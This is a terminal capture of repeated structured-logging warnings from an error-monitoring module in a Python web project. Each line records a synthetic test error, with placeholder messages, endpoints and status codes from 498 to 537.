WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788432Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1898'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788481Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1899'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788530Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1900'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1901'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1902'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788676Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1903'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788723Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1904'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788771Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1905'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788819Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1906'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1907'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1908'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1909'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789010Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1910'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1911'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789104Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1912'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789150Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1913'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789198Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1914'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1915'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789296Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1916'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789349Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1917'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789401Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1918'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789451Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1919'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1920'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1921'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1922'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1923'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789922Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1924'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.789972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1925'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1926'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790076Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1927'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790126Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1928'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790175Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1929'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790274Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1930'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1931'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1932'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790465Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1933'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790515Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1934'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1935'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1936'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1937'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
